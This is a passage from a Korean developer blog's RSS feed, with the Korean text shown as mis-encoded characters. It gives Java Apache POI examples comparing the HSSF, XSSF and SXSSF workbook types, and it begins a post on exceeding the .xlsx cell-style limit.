class="line">workbook.close(); <span class="comment">// dispose() í˜¸ì¶œ ì•ˆ í•¨ - ì„ì‹œ íŒŒì¼ì´ ì‚­ì œë˜ì§€ ì•ŠìŒ!</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// ì˜¬ë°”ë¥¸ ì˜ˆì‹œ</span></span><br><span class="line"><span class="type">SXSSFWorkbook</span> <span class="variable">workbook</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SXSSFWorkbook</span>();</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    workbook.write(outputStream);</span><br><span class="line">&#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">    workbook.dispose(); <span class="comment">// ì„ì‹œ íŒŒì¼ ì •ë¦¬</span></span><br><span class="line">    workbook.close();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="ë¹„êµí‘œ"><a href="#ë¹„êµí‘œ" class="headerlink" title="ë¹„êµí‘œ"></a>ë¹„êµí‘œ</h2><table><thead><tr><th>êµ¬ë¶„</th><th>HSSFWorkbook</th><th>XSSFWorkbook</th><th>SXSSFWorkbook</th></tr></thead><tbody><tr><td><strong>íŒŒì¼ í˜•ì‹</strong></td><td>.xls</td><td>.xlsx</td><td>.xlsx</td></tr><tr><td><strong>Excel ë²„ì „</strong></td><td>97-2003</td><td>2007+</td><td>2007+</td></tr><tr><td><strong>ìµœëŒ€ í–‰</strong></td><td>65,536</td><td>1,048,576</td><td>1,048,576</td></tr><tr><td><strong>ìµœëŒ€ ì—´</strong></td><td>256</td><td>16,384</td><td>16,384</td></tr><tr><td><strong>Cell Style ì œí•œ</strong></td><td>4,000</td><td>64,000</td><td>64,000</td></tr><tr><td><strong>ë©”ëª¨ë¦¬ ì‚¬ìš©</strong></td><td>ì¤‘ê°„</td><td>ë†’ìŒ</td><td>ë‚®ìŒ</td></tr><tr><td><strong>ì²˜ë¦¬ ì†ë„</strong></td><td>ë¹ ë¦„</td><td>ë³´í†µ</td><td>ë¹ ë¦„ (ì“°ê¸°)</td></tr><tr><td><strong>ì½ê¸° ì§€ì›</strong></td><td>âœ…</td><td>âœ…</td><td>âŒ</td></tr><tr><td><strong>ì“°ê¸° ì§€ì›</strong></td><td>âœ…</td><td>âœ…</td><td>âœ…</td></tr><tr><td><strong>ëœë¤ ì•¡ì„¸ìŠ¤</strong></td><td>âœ…</td><td>âœ…</td><td>âš ï¸ ì œí•œì </td></tr><tr><td><strong>ëŒ€ìš©ëŸ‰ ì²˜ë¦¬</strong></td><td>âŒ</td><td>âš ï¸ ì œí•œì </td><td>âœ…</td></tr><tr><td><strong>ì„ì‹œ íŒŒì¼</strong></td><td>âŒ</td><td>âŒ</td><td>âœ…</td></tr></tbody></table><h2 id="ì‚¬ìš©-ì‹œë‚˜ë¦¬ì˜¤ë³„-ì¶”ì²œ"><a href="#ì‚¬ìš©-ì‹œë‚˜ë¦¬ì˜¤ë³„-ì¶”ì²œ" class="headerlink" title="ì‚¬ìš© ì‹œë‚˜ë¦¬ì˜¤ë³„ ì¶”ì²œ"></a>ì‚¬ìš© ì‹œë‚˜ë¦¬ì˜¤ë³„ ì¶”ì²œ</h2><h3 id="HSSFWorkbook-ì‚¬ìš©-ê¶Œì¥"><a href="#HSSFWorkbook-ì‚¬ìš©-ê¶Œì¥" class="headerlink" title="HSSFWorkbook ì‚¬ìš© ê¶Œì¥"></a>HSSFWorkbook ì‚¬ìš© ê¶Œì¥</h3><ul><li>ì˜¤ë˜ëœ Excel íŒŒì¼(.xls) í˜¸í™˜ì„±ì´ í•„ìš”í•œ ê²½ìš°</li><li>ë°ì´í„°ê°€ 65,536í–‰ ì´í•˜ì¸ ê²½ìš°</li><li>ë¹ ë¥¸ ì²˜ë¦¬ ì†ë„ê°€ ì¤‘ìš”í•œ ê²½ìš°</li><li>ë ˆê±°ì‹œ ì‹œìŠ¤í…œê³¼ì˜ í†µí•©</li></ul><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// ë ˆê±°ì‹œ ì‹œìŠ¤í…œìš©</span></span><br><span class="line"><span class="keyword">if</span> (legacySystem) &#123;</span><br><span class="line">    <span class="type">Workbook</span> <span class="variable">workbook</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HSSFWorkbook</span>();</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="XSSFWorkbook-ì‚¬ìš©-ê¶Œì¥"><a href="#XSSFWorkbook-ì‚¬ìš©-ê¶Œì¥" class="headerlink" title="XSSFWorkbook ì‚¬ìš© ê¶Œì¥"></a>XSSFWorkbook ì‚¬ìš© ê¶Œì¥</h3><ul><li>í˜„ëŒ€ì ì¸ Excel ê¸°ëŠ¥ì´ í•„ìš”í•œ ê²½ìš°</li><li>ì½ê¸°ì™€ ì“°ê¸°ë¥¼ ëª¨ë‘ ìˆ˜í–‰í•´ì•¼ í•˜ëŠ” ê²½ìš°</li><li>ë°ì´í„° ìˆ˜ì •ì´ í•„ìš”í•œ ê²½ìš°</li><li>ì¤‘ê°„ ê·œëª¨ì˜ ë°ì´í„° (ìˆ˜ë§Œ í–‰)</li></ul><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// ì½ê¸° ë° ìˆ˜ì • ì‘ì—…</span></span><br><span class="line"><span class="keyword">try</span> (<span class="type">FileInputStream</span> <span class="variable">fis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;input.xlsx&quot;</span>)) &#123;</span><br><span class="line">    <span class="type">XSSFWorkbook</span> <span class="variable">workbook</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">XSSFWorkbook</span>(fis);</span><br><span class="line">    <span class="type">Sheet</span> <span class="variable">sheet</span> <span class="operator">=</span> workbook.getSheetAt(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ë°ì´í„° ì½ê¸° ë° ìˆ˜ì •</span></span><br><span class="line">    <span class="type">Row</span> <span class="variable">row</span> <span class="operator">=</span> sheet.getRow(<span class="number">0</span>);</span><br><span class="line">    <span class="type">Cell</span> <span class="variable">cell</span> <span class="operator">=</span> row.getCell(<span class="number">0</span>);</span><br><span class="line">    cell.setCellValue(<span class="string">&quot;Updated Value&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ì €ì¥</span></span><br><span class="line">    <span class="keyword">try</span> (<span class="type">FileOutputStream</span> <span class="variable">fos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;output.xlsx&quot;</span>)) &#123;</span><br><span class="line">        workbook.write(fos);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="SXSSFWorkbook-ì‚¬ìš©-ê¶Œì¥"><a href="#SXSSFWorkbook-ì‚¬ìš©-ê¶Œì¥" class="headerlink" title="SXSSFWorkbook ì‚¬ìš© ê¶Œì¥"></a>SXSSFWorkbook ì‚¬ìš© ê¶Œì¥</h3><ul><li>ëŒ€ìš©ëŸ‰ ë°ì´í„° ìƒì„± (10ë§Œ í–‰ ì´ìƒ)</li><li>ë©”ëª¨ë¦¬ê°€ ì œí•œì ì¸ í™˜ê²½</li><li>ì“°ê¸° ì „ìš© ì‘ì—…</li><li>ë¦¬í¬íŠ¸ ìƒì„±, ë°ì´í„° ë‚´ë³´ë‚´ê¸°</li></ul><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// ëŒ€ìš©ëŸ‰ ë¦¬í¬íŠ¸ ìƒì„±</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">generateLargeReport</span><span class="params">(List&lt;Data&gt; dataList)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    <span class="type">SXSSFWorkbook</span> <span class="variable">workbook</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SXSSFWorkbook</span>(<span class="number">100</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="type">Sheet</span> <span class="variable">sheet</span> <span class="operator">=</span> workbook.createSheet(<span class="string">&quot;Report&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> <span class="variable">rowNum</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (Data data : dataList) &#123; <span class="comment">// ìˆ˜ë°±ë§Œ ê±´</span></span><br><span class="line">            <span class="type">Row</span> <span class="variable">row</span> <span class="operator">=</span> sheet.createRow(rowNum++);</span><br><span class="line">            row.createCell(<span class="number">0</span>).setCellValue(data.getId());</span><br><span class="line">            row.createCell(<span class="number">1</span>).setCellValue(data.getName());</span><br><span class="line">            <span class="comment">// ...</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> (<span class="type">FileOutputStream</span> <span class="variable">fos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;report.xlsx&quot;</span>)) &#123;</span><br><span class="line">            workbook.write(fos);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">        workbook.dispose(); <span class="comment">// ì„ì‹œ íŒŒì¼ ì •ë¦¬</span></span><br><span class="line">        workbook.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="ì„±ëŠ¥-ë¹„êµ"><a href="#ì„±ëŠ¥-ë¹„êµ" class="headerlink" title="ì„±ëŠ¥ ë¹„êµ"></a>ì„±ëŠ¥ ë¹„êµ</h2><h3 id="ë©”ëª¨ë¦¬-ì‚¬ìš©ëŸ‰-100-000í–‰-ê¸°ì¤€"><a href="#ë©”ëª¨ë¦¬-ì‚¬ìš©ëŸ‰-100-000í–‰-ê¸°ì¤€" class="headerlink" title="ë©”ëª¨ë¦¬ ì‚¬ìš©ëŸ‰ (100,000í–‰ ê¸°ì¤€)"></a>ë©”ëª¨ë¦¬ ì‚¬ìš©ëŸ‰ (100,000í–‰ ê¸°ì¤€)</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">HSSFWorkbook:  ì§€ì› ë¶ˆê°€ (í–‰ ìˆ˜ ì œí•œ ì´ˆê³¼)</span><br><span class="line">XSSFWorkbook:  ì•½ 500MB - 1GB</span><br><span class="line">SXSSFWorkbook: ì•½ 50MB - 100MB (ìœˆë„ìš° í¬ê¸°ì— ë”°ë¼)</span><br></pre></td></tr></table></figure><h3 id="ì²˜ë¦¬-ì‹œê°„-100-000í–‰-ì“°ê¸°"><a href="#ì²˜ë¦¬-ì‹œê°„-100-000í–‰-ì“°ê¸°" class="headerlink" title="ì²˜ë¦¬ ì‹œê°„ (100,000í–‰ ì“°ê¸°)"></a>ì²˜ë¦¬ ì‹œê°„ (100,000í–‰ ì“°ê¸°)</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">HSSFWorkbook:  N/A</span><br><span class="line">XSSFWorkbook:  ì•½ 15-20ì´ˆ</span><br><span class="line">SXSSFWorkbook: ì•½ 8-12ì´ˆ</span><br></pre></td></tr></table></figure><h2 id="ì‹¤ë¬´-ì˜ˆì œ-ì¡°ê±´ë¶€-Workbook-ì„ íƒ"><a href="#ì‹¤ë¬´-ì˜ˆì œ-ì¡°ê±´ë¶€-Workbook-ì„ íƒ" class="headerlink" title="ì‹¤ë¬´ ì˜ˆì œ: ì¡°ê±´ë¶€ Workbook ì„ íƒ"></a>ì‹¤ë¬´ ì˜ˆì œ: ì¡°ê±´ë¶€ Workbook ì„ íƒ</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.poi.ss.usermodel.*;</span><br><span class="line"><span class="keyword">import</span> org.apache.poi.hssf.usermodel.HSSFWorkbook;</span><br><span class="line"><span class="keyword">import</span> org.apache.poi.xssf.usermodel.XSSFWorkbook;</span><br><span class="line"><span class="keyword">import</span> org.apache.poi.xssf.streaming.SXSSFWorkbook;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">WorkbookFactory</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Workbook <span class="title function_">createWorkbook</span><span class="params">(String fileType, <span class="type">int</span> estimatedRows)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="string">&quot;xls&quot;</span>.equalsIgnoreCase(fileType)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (estimatedRows &gt; <span class="number">65000</span>) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(</span><br><span class="line">                    <span class="string">&quot;XLS format does not support more than 65,536 rows&quot;</span></span><br><span class="line">                );</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">HSSFWorkbook</span>();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// xlsx í˜•ì‹</span></span><br><span class="line">        <span class="keyword">if</span> (estimatedRows &gt; <span class="number">50000</span>) &#123;</span><br><span class="line">            <span class="comment">// ëŒ€ìš©ëŸ‰: SXSSFWorkbook ì‚¬ìš©</span></span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">SXSSFWorkbook</span>(<span class="number">100</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// ì¤‘ì†ŒëŸ‰: XSSFWorkbook ì‚¬ìš©</span></span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">XSSFWorkbook</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">// ì‚¬ìš© ì˜ˆì‹œ</span></span><br><span class="line">        <span class="type">Workbook</span> <span class="variable">workbook</span> <span class="operator">=</span> createWorkbook(<span class="string">&quot;xlsx&quot;</span>, <span class="number">200000</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Sheet</span> <span class="variable">sheet</span> <span class="operator">=</span> workbook.createSheet(<span class="string">&quot;Data&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// ë°ì´í„° ì‘ì„±...</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span> (<span class="type">FileOutputStream</span> <span class="variable">fos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;output.xlsx&quot;</span>)) &#123;</span><br><span class="line">                workbook.write(fos);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            <span class="comment">// SXSSFWorkbookì¸ ê²½ìš° dispose() í˜¸ì¶œ</span></span><br><span class="line">            <span class="keyword">if</span> (workbook <span class="keyword">instanceof</span> SXSSFWorkbook) &#123;</span><br><span class="line">                ((SXSSFWorkbook) workbook).dispose();</span><br><span class="line">            &#125;</span><br><span class="line">            workbook.close();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Best-Practices"><a href="#Best-Practices" class="headerlink" title="Best Practices"></a>Best Practices</h2><h3 id="1-ì ì ˆí•œ-Workbook-ì„ íƒ"><a href="#1-ì ì ˆí•œ-Workbook-ì„ íƒ" class="headerlink" title="1. ì ì ˆí•œ Workbook ì„ íƒ"></a>1. ì ì ˆí•œ Workbook ì„ íƒ</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// íŒŒì¼ í¬ê¸°ì™€ ìš©ë„ì— ë”°ë¼ ì„ íƒ</span></span><br><span class="line"><span class="keyword">public</span> Workbook <span class="title function_">chooseWorkbook</span><span class="params">(<span class="type">int</span> rowCount, <span class="type">boolean</span> needsRead)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (needsRead) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">XSSFWorkbook</span>(); <span class="comment">// ì½ê¸° í•„ìš” ì‹œ XSSF</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (rowCount &gt; <span class="number">100000</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">SXSSFWorkbook</span>(<span class="number">1000</span>); <span class="comment">// ëŒ€ìš©ëŸ‰ì€ SXSSF</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">XSSFWorkbook</span>(); <span class="comment">// ê¸°ë³¸ì€ XSSF</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="2-ë¦¬ì†ŒìŠ¤-ê´€ë¦¬"><a href="#2-ë¦¬ì†ŒìŠ¤-ê´€ë¦¬" class="headerlink" title="2. ë¦¬ì†ŒìŠ¤ ê´€ë¦¬"></a>2. ë¦¬ì†ŒìŠ¤ ê´€ë¦¬</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// try-with-resources ì‚¬ìš©</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">processExcel</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    <span class="keyword">try</span> (<span class="type">SXSSFWorkbook</span> <span class="variable">workbook</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SXSSFWorkbook</span>();</span><br><span class="line">         <span class="type">FileOutputStream</span> <span class="variable">fos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;output.xlsx&quot;</span>)) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// ì‘ì—… ìˆ˜í–‰</span></span><br><span class="line">        <span class="type">Sheet</span> <span class="variable">sheet</span> <span class="operator">=</span> workbook.createSheet();</span><br><span class="line">        <span class="comment">// ...</span></span><br><span class="line"></span><br><span class="line">        workbook.write(fos);</span><br><span class="line">        workbook.dispose(); <span class="comment">// SXSSFëŠ” ë°˜ë“œì‹œ dispose() í˜¸ì¶œ</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="3-ë©”ëª¨ë¦¬-ìµœì í™”"><a href="#3-ë©”ëª¨ë¦¬-ìµœì í™”" class="headerlink" title="3. ë©”ëª¨ë¦¬ ìµœì í™”"></a>3. ë©”ëª¨ë¦¬ ìµœì í™”</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// SXSSFWorkbook ì‚¬ìš© ì‹œ ìœˆë„ìš° í¬ê¸° ì¡°ì •</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">optimizeMemory</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">// ë©”ëª¨ë¦¬ê°€ ì¶©ë¶„í•œ ê²½ìš°</span></span><br><span class="line">    <span class="type">SXSSFWorkbook</span> <span class="variable">workbook1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SXSSFWorkbook</span>(<span class="number">1000</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ë©”ëª¨ë¦¬ê°€ ì œí•œì ì¸ ê²½ìš°</span></span><br><span class="line">    <span class="type">SXSSFWorkbook</span> <span class="variable">workbook2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SXSSFWorkbook</span>(<span class="number">100</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ì„ì‹œ íŒŒì¼ ì••ì¶• í™œì„±í™”</span></span><br><span class="line">    workbook2.setCompressTempFiles(<span class="literal">true</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="4-ì—ëŸ¬-ì²˜ë¦¬"><a href="#4-ì—ëŸ¬-ì²˜ë¦¬" class="headerlink" title="4. ì—ëŸ¬ ì²˜ë¦¬"></a>4. ì—ëŸ¬ ì²˜ë¦¬</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">safeExcelGeneration</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">SXSSFWorkbook</span> <span class="variable">workbook</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        workbook = <span class="keyword">new</span> <span class="title class_">SXSSFWorkbook</span>();</span><br><span class="line">        <span class="type">Sheet</span> <span class="variable">sheet</span> <span class="operator">=</span> workbook.createSheet();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// ì‘ì—… ìˆ˜í–‰...</span></span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        <span class="comment">// ì—ëŸ¬ ì²˜ë¦¬</span></span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (workbook != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                workbook.dispose(); <span class="comment">// ì„ì‹œ íŒŒì¼ ì •ë¦¬</span></span><br><span class="line">                workbook.close();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="ì°¸ê³ ì‚¬í•­"><a href="#ì°¸ê³ ì‚¬í•­" class="headerlink" title="ì°¸ê³ ì‚¬í•­"></a>ì°¸ê³ ì‚¬í•­</h2><ul><li>Apache POI 5.x ë²„ì „ ê¸°ì¤€ì…ë‹ˆë‹¤.</li><li>ì‹¤ì œ ì„±ëŠ¥ì€ ì‹œìŠ¤í…œ ì‚¬ì–‘ê³¼ ë°ì´í„° íŠ¹ì„±ì— ë”°ë¼ ë‹¤ë¥¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤.</li><li>í”„ë¡œë•ì…˜ í™˜ê²½ì—ì„œëŠ” ì¶©ë¶„í•œ í…ŒìŠ¤íŠ¸ë¥¼ ê±°ì¹œ í›„ ì‚¬ìš©í•˜ì‹œê¸° ë°”ëë‹ˆë‹¤.</li></ul>]]></content:encoded>
      
      
      <category domain="https://ckck803.github.io/categories/Develop/">Develop</category>
      
      <category domain="https://ckck803.github.io/categories/Develop/JAVA/">JAVA</category>
      
      
      <category domain="https://ckck803.github.io/tags/Java/">Java</category>
      
      <category domain="https://ckck803.github.io/tags/Apache-POI/">Apache POI</category>
      
      <category domain="https://ckck803.github.io/tags/Excel/">Excel</category>
      
      <category domain="https://ckck803.github.io/tags/HSSFWorkbook/">HSSFWorkbook</category>
      
      <category domain="https://ckck803.github.io/tags/XSSFWorkbook/">XSSFWorkbook</category>
      
      <category domain="https://ckck803.github.io/tags/SXSSFWorkbook/">SXSSFWorkbook</category>
      
      
      <comments>https://ckck803.github.io/2025/12/21/java/poi-workbook-types/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[JAVA POI] - The maximum number of Cell Styles was exceeded.</title>
      <link>https://ckck803.github.io/2025/12/21/java/excel-cell-style-limit/</link>
      <guid>https://ckck803.github.io/2025/12/21/java/excel-cell-style-limit/</guid>
      <pubDate>Sat, 20 Dec 2025 15:00:00 GMT</pubDate>
      
      <description>&lt;p&gt;&lt;img src=&quot;/images/java/java.png&quot;&gt;&lt;/p&gt;
&lt;h2 id=&quot;ë¬¸ì œ-ìƒí™©&quot;&gt;&lt;a href=&quot;#ë¬¸ì œ-ìƒí™©&quot; class=&quot;headerlink&quot; title=&quot;ë¬¸ì œ ìƒí™©&quot;&gt;&lt;/a&gt;ë¬¸ì œ ìƒí™©&lt;/h2&gt;&lt;p&gt;Apache POIë¥¼ ì‚¬ìš©í•˜ì—¬ Excel íŒŒì¼(.xlsx)ì„ ìƒì„±í•˜ê±°ë‚˜ ìˆ˜ì •í•  ë•Œ ë‹¤ìŒê³¼ ê°™ì€ ì˜¤ë¥˜ê°€ ë°œìƒí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.&lt;/p&gt;
&lt;figure class=&quot;highlight plaintext&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;java.lang.IllegalStateException: The maximum number of Cell Styles was exceeded.&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;You can define up to 64000 style in a .xlsx Workbook&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h2 id=&quot;ë°œìƒ-ì›ì¸&quot;&gt;&lt;a href=&quot;#ë°œìƒ-ì›ì¸&quot; class=&quot;headerlink&quot; title=&quot;ë°œìƒ ì›ì¸&quot;&gt;&lt;/a&gt;ë°œìƒ ì›ì¸&lt;/h2&gt;&lt;h3 id=&quot;1-Cell-Style-ìƒì„±-ë°©ì‹ì˜-ë¬¸ì œ&quot;&gt;&lt;a href=&quot;#1-Cell-Style-ìƒì„±-ë°©ì‹ì˜-ë¬¸ì œ&quot; class=&quot;headerlink&quot; title=&quot;1. Cell Style ìƒì„± ë°©ì‹ì˜ ë¬¸ì œ&quot;&gt;&lt;/a&gt;1. Cell Style ìƒì„± ë°©ì‹ì˜ ë¬¸ì œ&lt;/h3&gt;&lt;p&gt;Excelì˜ &lt;code&gt;.xlsx&lt;/code&gt; íŒŒì¼ í˜•ì‹ì—ì„œëŠ” &lt;strong&gt;ìµœëŒ€ 64,000ê°œì˜ Cell Style&lt;/strong&gt;ë§Œ ìƒì„±í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ ì œí•œì€ Excel íŒŒì¼ í¬ë§·ì˜ ìŠ¤í™ì— ì •ì˜ëœ í•˜ë“œ ë¦¬ë¯¸íŠ¸ì…ë‹ˆë‹¤.&lt;/p&gt;
&lt;p&gt;ì¼ë°˜ì ìœ¼ë¡œ ì´ ì˜¤ë¥˜ëŠ” ë‹¤ìŒê³¼ ê°™ì€ ìƒí™©ì—ì„œ ë°œìƒí•©ë‹ˆë‹¤:&lt;/p&gt;
&lt;figure class=&quot;highlight java&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;// ì˜ëª»ëœ ì˜ˆì‹œ - ë°˜ë³µë¬¸ ì•ˆì—ì„œ ë§¤ë²ˆ ìƒˆë¡œìš´ ìŠ¤íƒ€ì¼ ìƒì„±&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;for&lt;/span&gt; (&lt;span class=&quot;type&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;variable&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;; i &amp;lt; rows.size(); i++) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;type&quot;&gt;Row&lt;/span&gt; &lt;span class=&quot;variable&quot;&gt;row&lt;/span&gt; &lt;span class=&quot;operator&quot;&gt;=&lt;/span&gt; sheet.createRow(i);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;type&quot;&gt;Cell&lt;/span&gt; &lt;span class=&quot;variable&quot;&gt;cell&lt;/span&gt; &lt;span class=&quot;operator&quot;&gt;=&lt;/span&gt; row.createCell(&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;comment&quot;&gt;// ë§¤ ì…€ë§ˆë‹¤ ìƒˆë¡œìš´ ìŠ¤íƒ€ì¼ì„ ìƒì„± (ë¬¸ì œ!)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;type&quot;&gt;CellStyle&lt;/span&gt; &lt;span class=&quot;variable&quot;&gt;style&lt;/span&gt; &lt;span class=&quot;operator&quot;&gt;=&lt;/span&gt; workbook.createCellStyle();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;type&quot;&gt;Font&lt;/span&gt; &lt;span class=&quot;variable&quot;&gt;font&lt;/span&gt; &lt;span class=&quot;operator&quot;&gt;=&lt;/span&gt; workbook.createFont();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    font.setBold(&lt;span class=&quot;literal&quot;&gt;true&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    style.setFont(font);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    cell.setCellStyle(style);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    